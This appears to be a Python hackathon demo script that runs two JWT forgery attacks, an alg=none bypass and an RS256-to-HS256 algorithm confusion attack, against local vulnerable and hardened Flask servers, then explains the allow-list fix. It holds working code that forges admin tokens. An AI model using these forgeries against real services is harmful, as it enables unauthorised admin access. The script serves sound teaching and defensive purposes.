"""
demo.py — End-to-end hackathon demo runner
===========================================
Starts both servers, runs all attacks against both, prints results,
then saves everything to demo_output.txt as a dry-run backup.

Usage:
    python demo.py

Expected output:
    Attack 1 (none alg)   vs VULNERABLE  -> HTTP 200  SUCCESS
    Attack 1 (none alg)   vs HARDENED    -> HTTP 401  BLOCKED
    Attack 2 (HS256 conf) vs VULNERABLE  -> HTTP 200  SUCCESS
    Attack 2 (HS256 conf) vs HARDENED    -> HTTP 401  BLOCKED

MITRE ATT&CK: T1550.001 — Use Alternate Authentication Material
"""

import base64
import hashlib
import hmac
import json
import subprocess
import sys
import time
import requests

VULN_URL = "http://localhost:5000"
HARD_URL = "http://localhost:5001"
OUTPUT_FILE = "demo_output.txt"

_output_lines = []


# ── Utilities ──────────────────────────────────────────────────────────────

def b64url_encode(data: dict) -> str:
    """base64url encode a dict as JWT segment (no padding — JWT spec)."""
    return (
        base64.urlsafe_b64encode(json.dumps(data, separators=(",", ":")).encode())
        .rstrip(b"=")
        .decode()
    )


def banner(text: str) -> None:
    """Print a large, readable section header for the live demo."""
    line = "=" * 65
    _print(f"\n{line}")
    _print(f"  {text}")
    _print(line)


def _print(msg: str) -> None:
    """Print to stdout and accumulate for demo_output.txt."""
    print(msg)
    _output_lines.append(msg)


def hit(base_url: str, token: str, label: str) -> None:
    """Send forged token to /admin and print a clear SUCCESS / BLOCKED result."""
    try:
        r = requests.get(
            f"{base_url}/admin",
            headers={"Authorization": f"Bearer {token}"},
            timeout=5,
        )
        if r.status_code == 200:
            tag = "[SUCCESS]"
            detail = r.json().get("flag", r.json())
        else:
            tag = "[BLOCKED]"
            detail = r.json().get("error", r.status_code)
        _print(f"  {tag:10s}  {label:38s}  HTTP {r.status_code}  |  {detail}")
    except requests.exceptions.ConnectionError:
        _print(f"  [ERROR]    {label:38s}  -- server not reachable --")


# ── Server management ──────────────────────────────────────────────────────

def _wait_for_server(url: str, timeout: int = 15) -> bool:
    """Poll until the server responds or timeout expires."""
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            requests.get(f"{url}/public-key", timeout=1)
            return True
        except Exception:
            time.sleep(0.5)
    return False


def start_servers():
    """Launch both Flask servers as background subprocesses."""
    vuln = subprocess.Popen(
        [sys.executable, "vulnerable_app.py"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    hard = subprocess.Popen(
        [sys.executable, "hardened_app.py"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )

    _print("  Starting vulnerable server (port 5000)...")
    if not _wait_for_server(VULN_URL):
        _print("  ERROR: vulnerable server did not start in time.")
        vuln.terminate()
        hard.terminate()
        sys.exit(1)
    _print("  Vulnerable server ready.")

    _print("  Starting hardened server  (port 5001)...")
    if not _wait_for_server(HARD_URL):
        _print("  ERROR: hardened server did not start in time.")
        vuln.terminate()
        hard.terminate()
        sys.exit(1)
    _print("  Hardened server ready.")

    return vuln, hard


# ── Attack 1 — "none" algorithm bypass ────────────────────────────────────

def build_none_token() -> str:
    """
    Forge a JWT with alg=none and an empty signature.
    No cryptographic material needed whatsoever.
    CVE equivalent: CVE-2015-9235
    """
    h = b64url_encode({"alg": "none", "typ": "JWT"})
    p = b64url_encode({"user": "attacker", "role": "admin"})
    return f"{h}.{p}."  # trailing dot = empty signature


# ── Attack 2 — RS256 → HS256 algorithm confusion ──────────────────────────

def build_confusion_token(public_key_pem: str) -> str:
    """
    Forge an HS256 JWT signed with the server's PUBLIC key as the HMAC secret.

    Why it works:
      RS256 (asymmetric): private key signs, public key verifies.
      HS256 (symmetric):  one shared secret does both.

    The vulnerable server verifies HS256 tokens using its public key.
    We know that public key (it's at /public-key), so we compute the same
    HMAC and produce a token the server accepts without the private key.

    Real-world precedent: CVE-2015-9235, Auth0 SDK confusion (2022)
    MITRE T1550.001: forging an application access token
    """
    h = b64url_encode({"alg": "HS256", "typ": "JWT"})
    p = b64url_encode({"user": "attacker", "role": "admin"})
    signing_input = f"{h}.{p}".encode("utf-8")

    sig = hmac.new(
        public_key_pem.encode("utf-8"),  # public key used as HMAC secret
        signing_input,
        hashlib.sha256,
    ).digest()
    sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b"=").decode()
    return f"{h}.{p}.{sig_b64}"


# ── Main demo ──────────────────────────────────────────────────────────────

def main() -> None:
    banner("JWT ATTACK DEMO  —  MITRE T1550.001  —  Problem #17")
    _print("  Target:  Cloud-Native REST API (Flask, RS256 JWT)")
    _print("  Pattern: AWS Cognito / Auth0 / GCP Identity all use RS256")
    _print("  Attack:  Forge admin tokens without the RSA private key")

    # ── Server startup ──────────────────────────────────────────────────
    banner("STARTING SERVERS")
    vuln_proc, hard_proc = start_servers()

    # Fetch public key once (used by Attack 2)
    pub_key = requests.get(f"{VULN_URL}/public-key").text
    _print(f"\n  Public key fetched ({len(pub_key)} bytes) — this is intentionally public.")
    _print(f"  First 60 chars: {pub_key[:60]}...")

    try:
        # ── Attack 1 ────────────────────────────────────────────────────
        banner("ATTACK 1 — 'none' Algorithm Bypass  (MITRE T1550.001)")
        _print("  Exploit: Set alg=none in token header, leave signature empty.")
        _print("  Impact:  Server skips verification — ANY claims accepted.")
        _print("  Needs:   Nothing. Zero cryptographic material required.\n")

        none_token = build_none_token()
        _print(f"  Forged token (first 60 chars): {none_token[:60]}...")
        hit(VULN_URL, none_token, "vs VULNERABLE server (port 5000)")
        hit(HARD_URL, none_token, "vs HARDENED   server (port 5001)")

        # ── Attack 2 ────────────────────────────────────────────────────
        banner("ATTACK 2 — RS256 to HS256 Algorithm Confusion  (CVE-2015-9235)")
        _print("  Exploit: Sign forged token with HS256 using the PUBLIC key as HMAC secret.")
        _print("  Why:     Vulnerable server verifies HS256 with its own public key —")
        _print("           same key we used. Signature matches. Token accepted.")
        _print("  Needs:   Only the public key from /public-key (no private key).\n")

        conf_token = build_confusion_token(pub_key)
        _print(f"  Forged token (first 60 chars): {conf_token[:60]}...")
        hit(VULN_URL, conf_token, "vs VULNERABLE server (port 5000)")
        hit(HARD_URL, conf_token, "vs HARDENED   server (port 5001)")

        # ── Fix explanation ──────────────────────────────────────────────
        banner("THE FIX — algorithms=['RS256']  (one line, hardened_app.py)")
        _print("  How it works at the PyJWT library level:")
        _print("  1. PyJWT reads alg from the token header.")
        _print("  2. Checks if alg is in the allowed list ['RS256'].")
        _print("  3. alg=none  -> not in list -> DecodeError before signature check.")
        _print("  4. alg=HS256 -> not in list -> DecodeError before signature check.")
        _print("  5. The fix is enforced by the library — attacker cannot bypass it")
        _print("     without compromising the RSA private key (private.pem).")
        _print("")
        _print("  Operational mitigations (production):")
        _print("  - API gateway algorithm allow-list (reject non-RS256 at edge)")
        _print("  - PyJWT version pinning in requirements.txt (>=2.0 for none removal)")
        _print("  - SIEM alerts on alg field changes in incoming tokens")

        # ── Summary ──────────────────────────────────────────────────────
        banner("DEMO COMPLETE")
        _print("  Attack 1 (none alg)   : VULNERABLE=200, HARDENED=401")
        _print("  Attack 2 (HS256 conf) : VULNERABLE=200, HARDENED=401")
        _print("  Fix: algorithms=['RS256'] blocks both at library level.")
        _print("  MITRE T1550.001 — Use Alternate Authentication Material")

    finally:
        # ── Cleanup ───────────────────────────────────────────────────────
        vuln_proc.terminate()
        hard_proc.terminate()
        _print("\n  Servers stopped.")

        with open(OUTPUT_FILE, "w", encoding="utf-8") as f:
            f.write("\n".join(_output_lines))
        _print(f"  Output saved to {OUTPUT_FILE} (use as backup if live demo breaks).")


if __name__ == "__main__":
    main()
